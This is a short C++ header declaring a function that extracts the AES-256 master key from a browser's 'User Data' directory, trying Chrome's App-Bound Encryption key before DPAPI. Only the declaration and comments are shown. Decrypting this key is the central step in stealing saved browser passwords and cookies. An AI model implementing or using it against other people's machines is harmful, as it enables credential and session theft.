#pragma once
#include <windows.h>
#include <vector>
#include <filesystem>

namespace db_helper {
    //returns the AES 256 master key for a browsers "User Data" directory
    //tries ABE (Chrome 127+) first if app_bound_encrypted_key is present, then DPAPI
    std::vector<BYTE> get_master_key(const std::filesystem::path& browser_root);
}
